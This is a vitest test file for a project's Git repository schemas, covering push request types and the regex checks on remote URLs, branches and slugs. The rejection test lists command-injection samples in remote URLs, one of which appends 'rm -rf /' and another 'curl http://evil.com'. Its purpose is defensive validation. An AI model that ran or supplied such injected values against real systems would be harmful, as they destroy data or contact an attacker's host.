import { describe, expect, it } from 'vitest'
import {
    ConfigureRepoRequest,
    GitBranchType,
    GitPushOperationType,
    GitRepo,
    GitRepoWithoutSensitiveData,
    PushEverythingGitRepoRequest,
    PushFlowsGitRepoRequest,
    PushGitRepoRequest,
    PushTablesGitRepoRequest,
} from '../../../src/lib/ee/git-repo'

describe('Git Repository Contracts (#141)', () => {
    describe('Enums', () => {
        it('defines valid GitBranchType values', () => {
            expect(GitBranchType.PRODUCTION).toBe('PRODUCTION')
            expect(GitBranchType.DEVELOPMENT).toBe('DEVELOPMENT')
        })

        it('defines valid GitPushOperationType values', () => {
            expect(GitPushOperationType.PUSH_FLOW).toBe('PUSH_FLOW')
            expect(GitPushOperationType.DELETE_FLOW).toBe('DELETE_FLOW')
            expect(GitPushOperationType.PUSH_TABLE).toBe('PUSH_TABLE')
            expect(GitPushOperationType.DELETE_TABLE).toBe('DELETE_TABLE')
            expect(GitPushOperationType.PUSH_EVERYTHING).toBe('PUSH_EVERYTHING')
        })
    })

    describe('GitRepo schema', () => {
        it('parses valid GitRepo entity with sshPrivateKey', () => {
            const raw = {
                id: 'repo-12345678901234567',
                created: '2026-10-01T00:00:00.000Z',
                updated: '2026-10-01T00:00:00.000Z',
                remoteUrl: 'git@github.com:org/repo.git',
                branch: 'main',
                branchType: GitBranchType.PRODUCTION,
                projectId: 'proj-123',
                sshPrivateKey: '-----BEGIN OPENSSH PRIVATE KEY-----\nMOCK\n-----END OPENSSH PRIVATE KEY-----',
                slug: 'main-repo',
            }
            const parsed = GitRepo.parse(raw)
            expect(parsed.slug).toBe('main-repo')
            expect(parsed.sshPrivateKey).toContain('OPENSSH PRIVATE KEY')
        })

        it('parses GitRepo with null sshPrivateKey', () => {
            const raw = {
                id: 'repo-12345678901234567',
                created: '2026-10-01T00:00:00.000Z',
                updated: '2026-10-01T00:00:00.000Z',
                remoteUrl: 'git@github.com:org/repo.git',
                branch: 'dev',
                branchType: GitBranchType.DEVELOPMENT,
                projectId: 'proj-123',
                sshPrivateKey: null,
                slug: 'dev-repo',
            }
            const parsed = GitRepo.parse(raw)
            expect(parsed.sshPrivateKey).toBeNull()
        })

        it('omits sshPrivateKey in GitRepoWithoutSensitiveData', () => {
            const raw = {
                id: 'repo-12345678901234567',
                created: '2026-10-01T00:00:00.000Z',
                updated: '2026-10-01T00:00:00.000Z',
                remoteUrl: 'git@github.com:org/repo.git',
                branch: 'main',
                branchType: GitBranchType.PRODUCTION,
                projectId: 'proj-123',
                slug: 'main-repo',
            }
            const parsed = GitRepoWithoutSensitiveData.parse(raw)
            expect('sshPrivateKey' in parsed).toBe(false)
            expect(parsed.slug).toBe('main-repo')
        })
    })

    describe('Push Requests', () => {
        it('validates PushFlowsGitRepoRequest for PUSH_FLOW and DELETE_FLOW', () => {
            const push = PushFlowsGitRepoRequest.parse({
                type: GitPushOperationType.PUSH_FLOW,
                commitMessage: 'feat(flows): update sync flow',
                externalFlowIds: ['flow-1', 'flow-2'],
            })
            expect(push.type).toBe('PUSH_FLOW')
            expect(push.externalFlowIds).toHaveLength(2)

            const del = PushFlowsGitRepoRequest.parse({
                type: GitPushOperationType.DELETE_FLOW,
                commitMessage: 'chore: remove deprecated flow',
                externalFlowIds: ['flow-3'],
            })
            expect(del.type).toBe('DELETE_FLOW')
        })

        it('validates PushTablesGitRepoRequest for PUSH_TABLE and DELETE_TABLE', () => {
            const push = PushTablesGitRepoRequest.parse({
                type: GitPushOperationType.PUSH_TABLE,
                commitMessage: 'feat(tables): add customers table',
                externalTableIds: ['tbl-1'],
            })
            expect(push.type).toBe('PUSH_TABLE')
            expect(push.externalTableIds).toHaveLength(1)

            const del = PushTablesGitRepoRequest.parse({
                type: GitPushOperationType.DELETE_TABLE,
                commitMessage: 'chore(tables): remove archived table',
                externalTableIds: ['tbl-2'],
            })
            expect(del.type).toBe('DELETE_TABLE')
            expect(del.externalTableIds).toHaveLength(1)
        })

        it('validates PushEverythingGitRepoRequest', () => {
            const push = PushEverythingGitRepoRequest.parse({
                type: GitPushOperationType.PUSH_EVERYTHING,
                commitMessage: 'ci: backup entire project',
            })
            expect(push.type).toBe('PUSH_EVERYTHING')
        })

        it('rejects empty commit message in push requests', () => {
            const result = PushEverythingGitRepoRequest.safeParse({
                type: GitPushOperationType.PUSH_EVERYTHING,
                commitMessage: '',
            })
            expect(result.success).toBe(false)
        })

        it('parses valid operations through PushGitRepoRequest union', () => {
            const parsed = PushGitRepoRequest.parse({
                type: GitPushOperationType.PUSH_FLOW,
                commitMessage: 'sync flow',
                externalFlowIds: ['flow-x'],
            })
            expect(parsed.type).toBe('PUSH_FLOW')
        })
    })

    describe('ConfigureRepoRequest schema & regex validations', () => {
        const validPayload = {
            projectId: 'proj-123',
            remoteUrl: 'git@github.com:Mihir-Rabari/inboxfm-connect.git',
            branch: 'dev',
            branchType: GitBranchType.DEVELOPMENT,
            sshPrivateKey: 'mock-private-key-data',
            slug: 'inboxfm-prod-sync',
        }

        it('accepts valid configuration payload', () => {
            const parsed = ConfigureRepoRequest.parse(validPayload)
            expect(parsed.remoteUrl).toBe('git@github.com:Mihir-Rabari/inboxfm-connect.git')
            expect(parsed.branch).toBe('dev')
            expect(parsed.slug).toBe('inboxfm-prod-sync')
        })

        describe('remoteUrl regex validation', () => {
            it('accepts valid SCP-like SSH git URLs', () => {
                const urls = [
                    'git@github.com:user/repo.git',
                    'git@github.com:user/repo',
                    'git@gitlab.company.org:subgroup/project.git',
                    'git@bitbucket.org:team/repo.git',
                ]
                for (const url of urls) {
                    const result = ConfigureRepoRequest.safeParse({ ...validPayload, remoteUrl: url })
                    expect(result.success).toBe(true)
                }
            })

            it('rejects non-SSH remote URLs or command injection attempts', () => {
                const invalidUrls = [
                    'https://github.com/user/repo.git',
                    'http://gitlab.com/user/repo.git',
                    'ssh://git@github.com/user/repo.git',
                    'git@github.com:user/repo;rm -rf /',
                    'git@github.com:user/repo && curl http://evil.com',
                    '',
                ]
                for (const url of invalidUrls) {
                    const result = ConfigureRepoRequest.safeParse({ ...validPayload, remoteUrl: url })
                    expect(result.success).toBe(false)
                }
            })
        })

        describe('branch regex validation', () => {
            it('accepts valid git branch names', () => {
                const branches = ['main', 'dev', 'feature/login-oauth', 'release/1.0.0', 'fix_issue_123']
                for (const branch of branches) {
                    const result = ConfigureRepoRequest.safeParse({ ...validPayload, branch })
                    expect(result.success).toBe(true)
                }
            })

            it('rejects branches starting with hyphen or containing illegal chars', () => {
                const invalidBranches = ['-flag', '-rf', 'branch with space', 'branch*wildcard']
                for (const branch of invalidBranches) {
                    const result = ConfigureRepoRequest.safeParse({ ...validPayload, branch })
                    expect(result.success).toBe(false)
                }
            })
        })

        describe('slug regex validation', () => {
            it('accepts valid alphanumeric slugs with dots, underscores and dashes', () => {
                const slugs = ['my-repo', 'project_1', 'backup.v1', 'PROD-2026']
                for (const slug of slugs) {
                    const result = ConfigureRepoRequest.safeParse({ ...validPayload, slug })
                    expect(result.success).toBe(true)
                }
            })

            it('rejects dot, dot-dot and special characters', () => {
                const invalidSlugs = ['.', '..', 'slug/slash', 'slug@invalid', '']
                for (const slug of invalidSlugs) {
                    const result = ConfigureRepoRequest.safeParse({ ...validPayload, slug })
                    expect(result.success).toBe(false)
                }
            })
        })
    })
})
